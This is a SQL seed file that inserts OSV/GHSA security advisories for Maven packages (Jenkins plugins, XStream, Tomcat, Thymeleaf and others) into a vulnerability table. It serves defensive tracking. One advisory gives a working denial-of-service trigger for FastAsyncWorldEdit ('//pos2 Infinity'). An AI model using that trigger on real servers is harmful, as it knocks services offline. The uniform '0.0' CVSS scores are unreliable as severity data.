INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-ghjw-fc9q-jj8c', 'OSV', 'org.jvnet.hudson.plugins:monitoring', 'maven', 'Jenkins Monitoring Plugin allows Cross-Site Scripting (XSS)', 'Cross-site scripting (XSS) vulnerability in the Monitoring plugin before 1.53.0 for Jenkins allows remote attackers to inject arbitrary web script or HTML via unspecified vectors.', '["1.10.0", "1.12.0", "1.13.0", "1.14.0", "1.15.0", "1.15.1", "1.17.0", "1.18.0", "1.19.0", "1.20.0", "1.21.0", "1.22.0", "1.23.0", "1.25.0", "1.26.0", "1.27.0", "1.28.0", "1.29.0", "1.30.0", "1.31.0", "1.32.0", "1.32.1", "1.33.0", "1.34.0", "1.35.0", "1.36.0", "1.37.0", "1.38.0", "1.39.0", "1.40.0", "1.41.0", "1.42.0", "1.43.0", "1.44.0", "1.45.0", "1.46.0", "1.47.0", "1.48.0", "1.49.0", "1.50.0", "1.51.0", "1.52.0", "1.52.1", "1.8.1", "1.8.2", "1.9.0"]'::jsonb, '0.0', '2022-05-17 03:51:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-whj9-m24x-qhhp', 'OSV', 'com.fastasyncworldedit:FastAsyncWorldEdit-Core', 'maven', 'FastAsyncWorldEdit vulnerable to Uncontrolled Resource Consumption', E'### Coordinated Disclosure Timeline

- 10.06.2023: Issue reported to IntellectualSites
- 11.06.2023: Issue is acknowledged
- 12.06.2023: Issue has been fixed
- 22.06.2023: Advisory has been published

### Impacted version range

Before 2.6.3

### Details

#### Proof of Concept

As a user, do the following:

1. Select position 1 via `//pos1`
2. Select position 2 adding the "Infinity" keyword via `//pos2 Infinity`
3. Execute any further operation.

The steps 1 and 2 are interchangeable.

#### Impact

Such a task has a possibility of bringing the performing server down.

#### CVE

- CVE-2023-35925

#### Credit

This issue was discovered and [reported](https://github.com/IntellectualSites/.github/blob/main/SECURITY.md) by @SuperMonis.

### Solution

On June 12, 2023, a patch, https://github.com/IntellectualSites/FastAsyncWorldEdit/pull/2285, has been merged addressing the vulnerability.
We strongly recommend users to update their version of FastAsyncWorldEdit to 2.6.3 as soon as possible.

### Workarounds

There is no direct mitigation besides updating FastAsyncWorldEdit to a patched version.

### Additional Information

Users with access to the `logs/` folder or shell access on their server can try to identify possible abuses of this issue by going through the logs.
To sieve through the data, you can use the regex query `\\/\\/pos[12] Infinity`, then investigate all log entries that return results.

### Disclosure Policy

If you discover a security vulnerability within our software, please report the issue according to our [vulnerability disclosure policy](https://github.com/IntellectualSites/.github/blob/main/SECURITY.md).', '["2.0.0", "2.0.1", "2.1.0", "2.1.1", "2.1.2", "2.2.0", "2.3.0", "2.4.0", "2.4.1", "2.4.10", "2.4.2", "2.4.3", "2.4.4", "2.4.5", "2.4.7", "2.4.8", "2.4.9", "2.5.0", "2.5.1", "2.5.2", "2.6.0", "2.6.1", "2.6.2"]'::jsonb, '0.0', '2023-06-22 20:00:36+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-gqxr-hvrw-6hfh', 'OSV', 'io.jenkins.plugins:cavisson-ns-nd-integration', 'maven', 'Jenkins NS-ND Integration Performance Publisher Plugin displays credentials without masking', 'Jenkins NS-ND Integration Performance Publisher Plugin stores credentials in job config.xml files on the Jenkins controller as part of its configuration.

While these credentials are stored encrypted on disk, in NS-ND Integration Performance Publisher Plugin 4.8.0.149 and earlier, the job configuration form does not mask these credentials, increasing the potential for attackers to observe and capture them.

NS-ND Integration Performance Publisher Plugin 4.11.0.48 masks credentials displayed on the configuration form.', '["4.6.0.23", "4.6.0.24", "4.6.1.40", "4.6.1.65", "4.6.1.65.1", "4.6.1.65.2", "4.6.1.66", "4.6.1.68", "4.6.1.69", "4.6.1.70", "4.6.1.76", "4.6.1.78", "4.6.1.79", "4.6.1.80", "4.6.1.82", "4.6.1.83", "4.6.1.85", "4.6.1.93", "4.8.0.129", "4.8.0.130", "4.8.0.134", "4.8.0.142", "4.8.0.143", "4.8.0.146", "4.8.0.147", "4.8.0.148", "4.8.0.149", "4.8.0.77"]'::jsonb, '0.0', '2023-05-16 18:30:16+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-jx45-xp6q-cwjc', 'OSV', 'io.jenkins.plugins:zoom', 'maven', 'Jenkins Zoom Plugin Stores Sensitive Information in Cleartext', 'Cleartext storage of sensitive information in the Zoom Jenkins Marketplace plugin before version 1.4 may allow an authenticated user to conduct a disclosure of information via network access.', '["1.0", "1.1", "1.2", "1.3"]'::jsonb, '0.0', '2025-01-30 21:31:23+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-x869-784m-jmj2', 'OSV', 'org.apache.mesos:mesos', 'maven', 'Denial of service in Apache Mesos', 'When handling a decoding failure for a malformed URL path of an HTTP request, libprocess in Apache Mesos might crash because the code accidentally calls inappropriate function. A malicious actor can therefore cause a denial of service of Mesos masters rendering the Mesos-controlled cluster inoperable.', '["1.3.0", "1.3.1-rc1"]'::jsonb, '0.0', '2022-05-13 01:47:05+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-c96x-rpm4-349p', 'OSV', 'org.springframework.boot:spring-boot-elasticsearch', 'maven', 'Spring Boot''s Elasticsearch auto-configuration doesn''t perform hostname verification when connecting to the Elasticsearch server.', 'When configured to use an SSL bundle, Spring Boot''s Elasticsearch auto-configuration does not perform hostname verification when connecting to the Elasticsearch server.

Affected: Spring Boot 4.0.0–4.0.5; upgrade to 4.0.6 or later per vendor advisory.', '["4.0.0", "4.0.1", "4.0.2", "4.0.3", "4.0.4", "4.0.5"]'::jsonb, '0.0', '2026-04-27 21:31:02+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-m59q-vgq9-75cr', 'OSV', 'net.praqma:rqm-plugin', 'maven', 'Password stored in plain text by Jenkins RQM Plugin', 'RQM Plugin 2.8 and earlier stores a password unencrypted in its global configuration file `net.praqma.jenkins.rqm.RqmBuilder.xml` on the Jenkins controller as part of its configuration.

This password can be viewed by users with access to the Jenkins controller file system.', '["1.0", "2.0", "2.1", "2.2", "2.3", "2.4", "2.5", "2.6", "2.7", "2.8"]'::jsonb, '0.0', '2022-07-01 00:01:08+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-7mfp-938r-fcfj', 'OSV', 'sh.hyper.plugins:hyper-commons', 'maven', 'Jenkins hyper.sh Commons Plugin stores credentials in plain text', 'Jenkins Hyper.sh Commons Plugin stores credentials unencrypted in its global configuration file `sh.hyper.plugins.hypercommons.Tools.xml` on the Jenkins controller. These credentials can be viewed by users with access to the Jenkins controller file system.', '["0.1.0", "0.1.2", "0.1.3", "0.1.4", "0.1.5"]'::jsonb, '0.0', '2022-05-13 01:17:42+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-wfpw-hqjg-58ph', 'OSV', 'com.barchart.jenkins:maven-release-cascade', 'maven', 'CSRF vulnerability in Jenkins Maven Cascade Release Plugin', 'A cross-site request forgery (CSRF) vulnerability in Jenkins Maven Cascade Release Plugin 1.3.2 and earlier allows attackers to start cascade builds and layout builds, and reconfigure the plugin.', '["1.0.0", "1.0.1", "1.0.2", "1.1.0", "1.2.0", "1.2.2", "1.3.0", "1.3.1", "1.3.2"]'::jsonb, '0.0', '2022-05-24 17:30:19+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-x3jj-rgw9-7r5g', 'OSV', 'com.groupon.jenkins-ci.plugins:DotCi', 'maven', 'RCE vulnerability in Jenkins DotCi Plugin', 'DotCi Plugin 2.40.00 and earlier does not configure its YAML parser to prevent the instantiation of arbitrary types.

This results in a remote code execution (RCE) vulnerability exploitable by attackers able to modify `.ci.yml` files in SCM. This plugin has been suspended.', '["1.0.0", "1.0.1", "1.0.2", "1.0.3", "1.1.0", "1.1.1", "1.2.0", "1.2.1", "1.2.2", "1.3.0", "1.3.1", "1.3.2", "1.3.3", "1.3.4", "2.0.0", "2.1.0", "2.10.0", "2.11.0", "2.11.1", "2.11.2", "2.12.0", "2.12.1", "2.12.2", "2.12.3", "2.13.0", "2.13.1", "2.14.0", "2.14.1", "2.14.2", "2.14.3", "2.14.4", "2.14.5", "2.15.0", "2.15.1", "2.16.0", "2.16.1", "2.17.0", "2.18.0", "2.19.0", "2.19.1", "2.19.3", "2.19.5", "2.2", "2.20.0", "2.20.1", "2.21.0", "2.22.0", "2.22.1", "2.23.0", "2.24.0", "2.24.1", "2.24.2", "2.24.3", "2.25.0", "2.25.1", "2.26.0", "2.27.0", "2.28.0", "2.28.1", "2.3", "2.30.2", "2.30.4", "2.30.7", "2.31.0", "2.32.0", "2.32.1", "2.33.0", "2.34.0", "2.35.0", "2.36.0", "2.36.1", "2.36.2", "2.37.0", "2.38.0", "2.38.1", "2.38.10", "2.38.11", "2.38.2", "2.38.3", "2.38.4", "2.38.5", "2.38.6", "2.38.7", "2.38.8", "2.38.9", "2.39.0", "2.39.1", "2.39.2", "2.39.3", "2.39.4", "2.39.5", "2.39.6", "2.39.7", "2.39.8", "2.39.9", "2.4", "2.40.00", "2.5", "2.5.1", "2.5.2", "2.5.3", "2.5.4", "2.6.0", "2.6.1", "2.6.2", "2.6.3", "2.6.4", "2.6.5", "2.6.6", "2.6.7", "2.6.8", "2.6.9", "2.7.0", "2.7.1", "2.7.2", "2.7.3", "2.7.4", "2.7.5", "2.7.6", "2.7.7", "2.7.8", "2.8.0", "2.8.1", "2.8.2", "2.8.3", "2.8.4", "2.8.5", "2.8.6", "2.8.7", "2.8.8", "2.8.9", "2.9.0", "2.9.1", "2.9.2"]'::jsonb, '0.0', '2022-09-22 00:00:28+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-6wf9-jmg9-vxcc', 'OSV', 'com.thoughtworks.xstream:xstream', 'maven', 'XStream can cause a Denial of Service', '### Impact
The vulnerability may allow a remote attacker to allocate 100% CPU time on the target system depending on CPU type or parallel execution of such a payload resulting in a denial of service only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream''s security framework with a whitelist limited to the minimal required types.

### Patches
XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.

### Workarounds
See [workarounds](https://x-stream.github.io/security.html#workaround) for the different versions covering all CVEs.

### References
See full information about the nature of the vulnerability and the steps to reproduce it in XStream''s documentation for [CVE-2021-39140](https://x-stream.github.io/CVE-2021-39140.html).

### Credits
The vulnerability was discovered and reported by Lai Han of nsfocus security team.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [XStream](https://github.com/x-stream/xstream/issues)
* Contact us at [XStream Google Group](https://groups.google.com/group/xstream-user)
', '["0.1", "0.2", "0.3", "0.5", "0.6", "1.0", "1.0.1", "1.0.2", "1.1", "1.1.1", "1.1.2", "1.1.3", "1.2", "1.2.1", "1.2.2", "1.3", "1.3.1", "1.4", "1.4.1", "1.4.10", "1.4.10-java7", "1.4.11", "1.4.11-java7", "1.4.11.1", "1.4.12", "1.4.12-java7", "1.4.13", "1.4.13-java7", "1.4.14", "1.4.14-java7", "1.4.14-jdk7", "1.4.15", "1.4.16", "1.4.17", "1.4.2", "1.4.3", "1.4.4", "1.4.5", "1.4.6", "1.4.7", "1.4.8", "1.4.9"]'::jsonb, '0.0', '2021-08-25 14:48:39+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-4hr2-xf7w-jf76', 'OSV', 'com.linecorp.centraldogma:centraldogma-server-auth-shiro', 'maven', 'Central Dogma''s Login Function Has an Open Redirect Vulnerability', '### Impact
Successful exploitation of this vulnerability could allow an attacker to craft a malicious link that, when clicked by a victim, redirects them to a phishing website designed to mimic the legitimate Central Dogma login page. This could result in the compromise of user accounts and unauthorized access to the Central Dogma instance.

### Patches
This vulnerability is addressed and resolved in Central Dogma version 0.78.0. The server operators who run Central Dogma server with Shiro authentication are strongly encouraged to upgrade to this version or later to mitigate the risk associated with the open redirect vulnerability.

### Workarounds
Implement `AuthProvider` to overrides `webLoginService()`.

### References
- https://cwe.mitre.org/data/definitions/601.html', '["0.33.0", "0.34.0", "0.35.0", "0.35.1", "0.36.0", "0.37.0", "0.38.0", "0.39.0", "0.39.1", "0.39.2", "0.40.0", "0.40.1", "0.41.0", "0.41.1", "0.41.2", "0.41.3", "0.41.4", "0.42.0", "0.43.0", "0.43.1", "0.43.2", "0.43.3", "0.43.4", "0.44.0", "0.44.1", "0.44.10", "0.44.11", "0.44.12", "0.44.13", "0.44.14", "0.44.2", "0.44.3", "0.44.4", "0.44.5", "0.44.6", "0.44.7", "0.44.8", "0.44.9", "0.45.0", "0.45.1", "0.46.0", "0.46.1", "0.47.0", "0.47.1", "0.48.0", "0.49.0", "0.49.1", "0.50.0", "0.51.0", "0.51.1", "0.52.0", "0.52.1", "0.52.2", "0.52.3", "0.52.4", "0.52.5", "0.52.6", "0.53.0", "0.53.1", "0.54.0", "0.55.0", "0.55.1", "0.55.2", "0.56.0", "0.56.1", "0.56.2", "0.57.0", "0.57.1", "0.57.2", "0.57.3", "0.58.0", "0.58.1", "0.59.0", "0.60.0", "0.60.1", "0.61.0", "0.61.1", "0.61.2", "0.61.3", "0.61.4", "0.61.5", "0.62.0", "0.62.1", "0.63.0", "0.63.1", "0.63.2", "0.63.3", "0.64.0", "0.64.1", "0.64.2", "0.64.3", "0.65.0", "0.65.1", "0.66.0", "0.66.1", "0.67.0", "0.67.1", "0.67.2", "0.67.3", "0.68.0", "0.69.0", "0.69.1", "0.70.0", "0.71.0", "0.72.0", "0.73.0", "0.73.1", "0.74.0", "0.75.0", "0.75.1", "0.76.0", "0.77.0", "0.77.1", "0.77.2", "0.77.3", "0.77.4"]'::jsonb, '0.0', '2025-12-04 16:57:17+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-cjjf-94ff-43w7', 'OSV', 'com.fasterxml.jackson.core:jackson-databind', 'maven', 'jackson-databind Deserialization of Untrusted Data vulnerability', 'An issue was discovered in FasterXML jackson-databind prior to 2.7.9.4, 2.8.11.2, and 2.9.6. When Default Typing is enabled (either globally or for a specific property), the service has the Jodd-db jar (for database access for the Jodd framework) in the classpath, and an attacker can provide an LDAP service to access, it is possible to make the service execute a malicious payload.', '["2.9.0", "2.9.0.pr1", "2.9.0.pr2", "2.9.0.pr3", "2.9.0.pr4", "2.9.1", "2.9.2", "2.9.3", "2.9.4", "2.9.5"]'::jsonb, '0.0', '2019-03-25 18:03:09+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-c9ph-gxww-7744', 'OSV', 'org.thymeleaf:thymeleaf', 'maven', 'Sandboxed Thymeleaf expressions vulnerable to improper recognition of unauthorized syntax patterns', '### Impact

A security bypass vulnerability exists in the expression execution mechanisms of Thymeleaf up to and including 3.1.4.RELEASE. Although the library provides mechanisms to avoid the execution of potentially dangerous expressions in some specific sandboxed (restricted) contexts, it fails to properly neutralize specific constructs that allow this kind of expressions to be executed. If an application developer passes to the template engine unsanitized variables that contain such expressions, and these values are used in sandboxed contexts inside the templates, these expressions can be executed achieving Server-Side Template Injection (SSTI).

### Patches

This has been fixed in Thymeleaf 3.1.5.RELEASE. All users are advised to upgrade immediately.

### Workarounds

No workaround is available beyond ensuring applications do not pass unvalidated/unsanitized data directly to the template engine. Upgrading to 3.1.5.RELEASE is strongly recommended in any case.', '["3.1.0.M1", "3.1.0.M2", "3.1.0.M3", "3.1.0.RC1", "3.1.0.RC2", "3.1.0.RELEASE", "3.1.1.RELEASE", "3.1.2.RELEASE", "3.1.3.RELEASE", "3.1.4.RELEASE"]'::jsonb, '0.0', '2026-05-04 21:15:20+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-q7q9-w24q-cpgh', 'OSV', 'org.apache.ambari:ambari', 'maven', 'Cross-site Scripting (XSS) in Apache Ambari Views', 'A cross-site scripting issue was found in Apache Ambari Views. This was addressed in Apache Ambari 2.7.4.', '["1.7.0.0", "2.0.0.0"]'::jsonb, '0.0', '2022-01-06 20:35:22+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-2v6r-jf2g-j5q5', 'OSV', 'org.jenkins-ci.plugins:rich-text-publisher-plugin', 'maven', 'Cross-site Scripting in Jenkins Rich Text Publisher Plugin', 'Jenkins Rich Text Publisher Plugin 1.4 and earlier does not escape the HTML message set by its post-build step, resulting in a stored cross-site scripting (XSS) vulnerability exploitable by attackers able to configure jobs.', '["1.0", "1.1", "1.2", "1.3", "1.4"]'::jsonb, '0.0', '2022-07-01 00:01:07+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-2w4h-f44w-968f', 'OSV', 'org.neo4j:neo4j-kernel', 'maven', 'Improper Privilege Management in Neo4j Graph Database', 'A failure in resetting the security context in some transaction actions in Neo4j Graph Database 4.2 could allow authenticated users to execute commands with elevated privileges.', '["4.2.0", "4.2.1", "4.2.2", "4.2.3", "4.2.4", "4.2.5", "4.2.6", "4.2.7"]'::jsonb, '0.0', '2022-05-24 19:09:23+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-23hv-mwm6-g8jf', 'OSV', 'org.apache.tomcat:tomcat-catalina', 'maven', 'Apache Tomcat Session Fixation vulnerability', 'Session Fixation vulnerability in Apache Tomcat via rewrite valve.

This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.7, from 10.1.0-M1 through 10.1.41, from 9.0.0.M1 through 9.0.105.
Older, EOL versions may also be affected.

Users are recommended to upgrade to version 11.0.8, 10.1.42 or 9.0.106, which fix the issue.', '["9.0.0.M1", "9.0.0.M10", "9.0.0.M11", "9.0.0.M13", "9.0.0.M15", "9.0.0.M17", "9.0.0.M18", "9.0.0.M19", "9.0.0.M20", "9.0.0.M21", "9.0.0.M22", "9.0.0.M25", "9.0.0.M26", "9.0.0.M27", "9.0.0.M3", "9.0.0.M4", "9.0.0.M6", "9.0.0.M8", "9.0.0.M9", "9.0.1", "9.0.10", "9.0.100", "9.0.102", "9.0.104", "9.0.105", "9.0.11", "9.0.12", "9.0.13", "9.0.14", "9.0.16", "9.0.17", "9.0.19", "9.0.2", "9.0.20", "9.0.21", "9.0.22", "9.0.24", "9.0.26", "9.0.27", "9.0.29", "9.0.30", "9.0.31", "9.0.33", "9.0.34", "9.0.35", "9.0.36", "9.0.37", "9.0.38", "9.0.39", "9.0.4", "9.0.40", "9.0.41", "9.0.43", "9.0.44", "9.0.45", "9.0.46", "9.0.48", "9.0.5", "9.0.50", "9.0.52", "9.0.53", "9.0.54", "9.0.55", "9.0.56", "9.0.58", "9.0.59", "9.0.6", "9.0.60", "9.0.62", "9.0.63", "9.0.64", "9.0.65", "9.0.67", "9.0.68", "9.0.69", "9.0.7", "9.0.70", "9.0.71", "9.0.72", "9.0.73", "9.0.74", "9.0.75", "9.0.76", "9.0.78", "9.0.79", "9.0.8", "9.0.80", "9.0.81", "9.0.82", "9.0.83", "9.0.84", "9.0.85", "9.0.86", "9.0.87", "9.0.88", "9.0.89", "9.0.90", "9.0.91", "9.0.93", "9.0.94", "9.0.95", "9.0.96", "9.0.97", "9.0.98", "9.0.99"]'::jsonb, '0.0', '2025-08-13 15:30:34+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-hx3r-qwxv-5jw9', 'OSV', 'org.jenkins-ci.plugins:gitlab-oauth', 'maven', 'Client Secret stored in plain text by Jenkins GitLab Authentication Plugin', 'Jenkins GitLab Authentication Plugin 1.13 and earlier stores the GitLab client secret unencrypted in the global `config.xml` file on the Jenkins controller where it can be viewed by users with access to the Jenkins controller file system.

This client secret can be viewed by users with access to the Jenkins controller file system.', '["1.0.3", "1.0.4", "1.0.5", "1.0.6", "1.0.7", "1.0.8", "1.0.9", "1.1", "1.10", "1.11", "1.12", "1.13", "1.2", "1.3", "1.4", "1.5", "1.6", "1.7", "1.8", "1.9"]'::jsonb, '0.0', '2022-03-16 00:00:43+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-c4jr-vjm4-27hq', 'OSV', 'com.veracode.jenkins:veracode-scan', 'maven', 'Veracode Scan Jenkins Plugin vulnerable to information disclosure', 'Veracode Scan Jenkins Plugin before 23.3.19.0 is vulnerable to information disclosure of proxy credentials in job logs under specific configurations.

Users are potentially affected if they:
- are using Veracode Scan Jenkins Plugin prior to 23.3.19.0
- AND have configured Veracode Scan to run on remote agent jobs
- AND have enabled the "Connect using proxy" option
- AND have configured the proxy settings with proxy credentials
- AND a Jenkins admin has enabled debug in global system settings.

By default, even in this configuration only the job owner or Jenkins admin can view the job log.', '["1.0.5-alpha", "20.6.10.0", "20.6.10.0-alpha", "20.6.10.2-alpha", "20.9.11.0", "21.12.17.0", "21.2.12.0", "21.6.13.0", "21.7.14.0", "21.8.15.0", "21.9.16.0", "22.2.17.1", "22.5.17.2", "22.6.18.0"]'::jsonb, '0.0', '2023-03-28 21:30:20+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-mxf8-grm7-mvqw', 'OSV', 'org.jenkins-ci.plugins:websphere-deployer', 'maven', 'Jenkins WebSphere Deployer Plugin missing permission check', 'Jenkins WebSphere Deployer Plugin 1.6.1 and earlier does not perform permission checks in methods performing form validation. This allows users with Overall/Read access to perform connection tests, determine whether files with an attacker-specified path exist on the Jenkins controller file system, and obtain limited information about the Jenkins and plugin configuration based on the responses. The latter include the ability to set plugin configuration options.

Additionally, these form validation methods do not require POST requests, resulting in a CSRF vulnerability.

As of publication of this advisory, there is no fix.', '["1.1", "1.2", "1.3.4", "1.5.5", "1.5.6", "1.6.0", "1.6.1"]'::jsonb, '0.0', '2022-05-24 17:03:47+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-6qjp-wm6g-m32r', 'OSV', 'org.wso2.am:am-parent', 'maven', 'WSO2 incorrect authorization vulnerability', 'An incorrect authorization vulnerability exists in multiple WSO2 products, allowing protected APIs to be accessed directly using a refresh token instead of the expected access token. Due to improper authorization checks and token mapping, session cookies are not required for API access, potentially enabling unauthorized operations.

Exploitation requires an attacker to obtain a valid refresh token of an admin user. Since refresh tokens generally have a longer expiration time, this could lead to prolonged unauthorized access to API resources, impacting data confidentiality and integrity.', '["5.11.0-alpha", "5.11.0-alpha2", "5.11.0-alpha3", "5.11.0-beta", "5.11.0-beta2", "5.11.0-beta3", "5.11.0-beta4", "5.11.0-beta5", "5.11.0-m10", "5.11.0-m11", "5.11.0-m12", "5.11.0-m13", "5.11.0-m14", "5.11.0-m15", "5.11.0-m16", "5.11.0-m17", "5.11.0-m18", "5.11.0-m19", "5.11.0-m2", "5.11.0-m20", "5.11.0-m21", "5.11.0-m22", "5.11.0-m23", "5.11.0-m24", "5.11.0-m25", "5.11.0-m26", "5.11.0-m27", "5.11.0-m28", "5.11.0-m29", "5.11.0-m3", "5.11.0-m30", "5.11.0-m31", "5.11.0-m32", "5.11.0-m33", "5.11.0-m34", "5.11.0-m35", "5.11.0-m4", "5.11.0-m5", "5.11.0-m6", "5.11.0-m7", "5.11.0-m8", "5.11.0-m9"]'::jsonb, '0.0', '2025-02-27 06:30:53+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-2pp9-r4rv-6p6j', 'OSV', 'org.jenkins-ci.main:jenkins-core', 'maven', 'Exposure of Sensitive Information to an Unauthorized Actor in Jenkins', 'A exposure of sensitive information vulnerability exists in Jenkins 2.132 and earlier, 2.121.1 and earlier in Plugin.java that allows attackers to determine the date and time when a plugin HPI/JPI file was last extracted, which typically is the date of the most recent installation/upgrade.', '["2.122", "2.123", "2.124", "2.125", "2.126", "2.127", "2.128", "2.129", "2.130", "2.131"]'::jsonb, '0.0', '2022-05-14 01:05:26+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-jf8x-943c-r4h6', 'OSV', 'com.paul8620.jenkins.plugins:pipeline-aggregator-view', 'maven', 'Jenkins Pipeline Aggregator View Plugin stored XSS vulnerability', 'Jenkins Pipeline Aggregator View Plugin 1.8 and earlier does not escape information shown on its view, resulting in a stored XSS vulnerability exploitable by attackers able to affects view content such as job display name or pipeline stage names.', '["1.0", "1.1", "1.2", "1.3", "1.4", "1.4.1", "1.5", "1.6", "1.7", "1.8"]'::jsonb, '0.0', '2022-05-24 17:03:48+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-6hgr-2g6q-3rmc', 'OSV', 'com.vaadin:flow-client', 'maven', 'Server session is not invalidated when logout() helper method of Authentication module is used in Vaadin 18-19', '`Authentication.logout()` helper in `com.vaadin:flow-client` versions 5.0.0 prior to 6.0.0 (Vaadin 18), and 6.0.0 through 6.0.4 (Vaadin 19.0.0 through 19.0.3) uses incorrect HTTP method, which, in combination with Spring Security CSRF protection, allows local attackers to access Fusion endpoints after the user attempted to log out.

- https://vaadin.com/security/cve-2021-31408', '["5.0.0", "5.0.1", "5.0.2", "5.0.3", "5.0.4", "6.0.0", "6.0.1", "6.0.2", "6.0.3", "6.0.4"]'::jsonb, '0.0', '2021-04-22 16:11:26+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-m8p2-495h-ccmh', 'OSV', 'org.hibernate.validator:hibernate-validator', 'maven', 'The SafeHtml annotation in Hibernate-Validator does not properly guard against XSS attacks', 'A vulnerability was found in Hibernate-Validator. The SafeHtml validator annotation fails to properly sanitize payloads consisting of potentially malicious code in HTML comments and instructions. This vulnerability can result in an XSS attack.', '["6.0.0.Alpha1", "6.0.0.Alpha2", "6.0.0.Beta1", "6.0.0.Beta2", "6.0.0.CR1", "6.0.0.CR2", "6.0.0.CR3", "6.0.0.Final", "6.0.1.Final", "6.0.10.Final", "6.0.11.Final", "6.0.12.Final", "6.0.13.Final", "6.0.14.Final", "6.0.15.Final", "6.0.16.Final", "6.0.17.Final", "6.0.2.Final", "6.0.3.Final", "6.0.4.Final", "6.0.5.Final", "6.0.6.Final", "6.0.7.Final", "6.0.8.Final", "6.0.9.Final"]'::jsonb, '0.0', '2020-01-08 17:01:52+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-q7fr-vqhq-v5xr', 'OSV', 'org.apache.activemq:artemis-openwire-protocol', 'maven', 'Apache ActiveMQ Artemis vulnerable to Improper Access Control', 'While investigating ARTEMIS-2964 it was found that the creation of advisory messages in the OpenWire protocol head of Apache ActiveMQ Artemis 2.15.0 bypassed policy based access control for the entire session. Production of advisory messages was not subject to access control in error.', '["1.0.0", "1.1.0", "1.2.0", "1.3.0", "1.4.0", "1.5.0", "1.5.1", "1.5.2", "1.5.3", "1.5.4", "1.5.5", "1.5.6", "2.0.0", "2.1.0", "2.10.0", "2.10.1", "2.11.0", "2.12.0", "2.13.0", "2.14.0", "2.15.0", "2.2.0", "2.3.0", "2.4.0", "2.5.0", "2.6.0", "2.6.1", "2.6.2", "2.6.3", "2.6.4", "2.7.0", "2.8.0", "2.8.1", "2.9.0"]'::jsonb, '0.0', '2021-06-16 17:39:05+00') ON CONFLICT (id) DO NOTHING;
